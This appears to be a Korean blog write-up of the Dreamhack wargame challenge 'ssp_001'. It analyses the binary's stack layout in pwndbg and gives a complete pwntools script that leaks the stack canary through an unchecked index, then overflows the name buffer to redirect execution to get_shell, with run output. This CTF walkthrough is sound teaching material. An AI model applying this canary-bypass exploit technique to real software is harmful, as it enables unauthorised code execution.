---
title: ssp_001
author: hwang
date: 2024-05-13 14:30:00 +0900
categories: [Dreamhack, System Hacking]
tags: [ssp_001]     # TAG names should always be lowercase
---

## Description
이 문제는 작동하고 있는 서비스(ssp_001)의 바이너리와 소스코드가 주어집니다.
프로그램의 취약점을 찾고 SSP 방어 기법을 우회하여 익스플로잇해 셸을 획득한 후, "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

## Environment
```text
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

## Solution
먼저, 주어진 Envrionment 정보를 확인해보자. NX와 Canary가 적용되었다. 

주어진 C코드를 분석해보자.

이 문제에는 get_shell()함수를 통해 직접 쉘에 접근할 수 있다. ELF symbol 테이블에서 꺼내 쓰면 된다. 또한, print_box()함수에 idx의 범위가 주어지지 않았다. 이를 통해 적절한 idx값을 넣어 Canary값을 읽을 수 있다.

이후, pwndbg로 디버깅 하였다.
```bash
$ sudo gdb -q ssp_001

pwndbg> disass main
```
Canary가 사용된 부분을 확인하였다.
```text
   0x0804873e <+19>:	mov    eax,gs:0x14
   0x08048744 <+25>:	mov    DWORD PTR [ebp-0x8],eax


   0x0804886c <+321>:	mov    edx,DWORD PTR [ebp-0x8]
   0x0804886f <+324>:	xor    edx,DWORD PTR gs:0x14
   0x08048876 <+331>:	je     0x8048884 <main+345>
   0x08048878 <+333>:	jmp    0x804887f <main+340>
   0x0804887a <+335>:	jmp    0x8048790 <main+101>
   0x0804887f <+340>:	call   0x80484e0 <__stack_chk_fail@plt>
   0x08048884 <+345>:	mov    edi,DWORD PTR [ebp-0x4]
   0x08048887 <+348>:	leave  
   0x08048888 <+349>:	ret    
End of assembler dump.
```
처음에 eax레지스터에 gs:0x14을 저장하고, 이를 ebp-0x8에 저장한다. 이후, ebp-0x8과 gs:0x14을 xor하여 값의 변화가 있을 경우 <__stack_chk_fail@plt>을 호출하여 프로그램을 강제로 종료한다.

select의 위치는 [ebp-0x8a]이다.
```text
   0x08048795 <+106>:	push   0x2 # push 2
   0x08048797 <+108>:	lea    eax,[ebp-0x8a] # eax = select
   0x0804879d <+114>:	push   eax # push select
   0x0804879e <+115>:	push   0x0 # push 0
   0x080487a0 <+117>:	call   0x80484a0 <read@plt> # read(0, select, 2)
```

box의 위치는 [ebp-0x88]이다.
```text
   0x080487d3 <+168>:	push   0x40 # push 0x40(sizeof(box))
   0x080487d5 <+170>:	lea    eax,[ebp-0x88] # eax = box
   0x080487db <+176>:	push   eax # push box
   0x080487dc <+177>:	push   0x0 # push 0
   0x080487de <+179>:	call   0x80484a0 <read@plt> # read(0, box, sizeof(box));
   ```

idx의 위치는 [ebp-0x94]이다.
```text
   0x080487f8 <+205>:	lea    eax,[ebp-0x94] # eax = idx
   0x080487fe <+211>:	push   eax # push idx
   0x080487ff <+212>:	push   0x804898a # push "%d"
   0x08048804 <+217>:	call   0x8048540 <__isoc99_scanf@plt> # scanf("%d", &idx);
   ```

 name_len의 위치는 [ebp-0x90]이다.  
```text
   0x08048831 <+262>:	lea    eax,[ebp-0x90] # eax = name_len
   0x08048837 <+268>:	push   eax # push name_len
   0x08048838 <+269>:	push   0x804898a # push "%d"
   0x0804883d <+274>:	call   0x8048540 <__isoc99_scanf@plt> # scanf("%d", &name_len);
   ```

name의 위치는 [ebp-0x48]이다.
```text
   0x08048852 <+295>:	mov    eax,DWORD PTR [ebp-0x90] # eax = name_len
   0x08048858 <+301>:	push   eax # push name_len
   0x08048859 <+302>:	lea    eax,[ebp-0x48] # eax = name
   0x0804885c <+305>:	push   eax # push name
   0x0804885d <+306>:	push   0x0 # push 0
   0x0804885f <+308>:	call   0x80484a0 <read@plt> # read(0, name, name_len);
   ```

ebp 레지스터의 값을 확인하기 위해, main+25에 breakpoint를 지정하고, ebp 위로 4개의 주소를 읽었다.

ebp의 값은 0xf7ffd020이다.
```bash
pwndbg> b *main+25
pwndbg> c
pwndbg> x/4wx $ebp

0xffffd678:	0xf7ffd020	0xf7c21519	0x00000001 0xffffd734
```
이제 canary의 값을 살펴보겠다. $ebp-0x8에 카나리값이 작성된 직후의 레지스터를 확인하겠다.

canary의 값은 0x14d8b900이다.
```bash
pwndbg> ni
pwndbg> x/4wx $ebp - 0x8

0xffffd670:	0x14d8b900	0xf7ffcb80	0xf7ffd020	0xf7c21519

pwndbg> canary
AT_RANDOM = 0xffffd84b # points to (not masked) global canary value
Canary    = 0x14d8b900 (may be incorrect on != glibc)
Found valid canaries on the stacks:
00:0000│-2ac 0xffffd3cc ◂— 0x14d8b900
00:0000│-008 0xffffd670 ◂— 0x14d8b900
00:0000│+054 0xffffd6cc ◂— 0x14d8b900
```
ebp와 canary 사이에 0xf7ffcb80, 4바이트의 덤프값이 존재한다.

ret값은 0xf7c21519이다.

이제, 주어진 정보를 바탕으로 Exploit코드를 만들어 보았다.
```python
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./ssp_001')
#p = remote('host3.dreamhack.games', 12275)

e = ELF('./ssp_001')
get_shell = e.symbols['get_shell']

canary = b""

# Canary 값을 출력, 이때, little-endian 방식을 고려하여 index 넣기
for i in range(3, -1, -1):
    p.recvuntil(b'> ')
    p.send(b'P')
    value = 128 + i
    byte_representation = bytes(str(value), 'utf-8')
    p.sendlineafter(b'Element index : ', byte_representation)
    p.recvuntil(b': ')
    canary += p.recvn(2)

canary = int(canary, 16)
slog('Canary Address', canary)

# name 버퍼를 임의로 채운 후 카나리 값을 32비트로 패킹, 
# 이후 더미 4바이트와 ebp 4바이트를 임의로 채우고 ret에 get_shell값을 32비트로 패킹하여 전송
payload = b'A' * 64 + p32(canary) + b'B' * 8 + p32(get_shell)

p.sendlineafter(b'> ', b'E')
p.sendlineafter(b'Name Size : ', str(1000))
p.sendlineafter(b'Name : ', payload)

p.interactive()
```
실행 결과는 다음과 같다.
```bash
[+] Starting local process './ssp_001': pid 2903
[*] '/home/hwangshincheol/test/ssp_001/ssp_001'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Canary Address: 0xf1f1000
/home/hwangshincheol/test/ssp_001/ssp_001.py:28: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendlineafter(b'Name Size : ', str(1000))
[*] Switching to interactive mode
$
```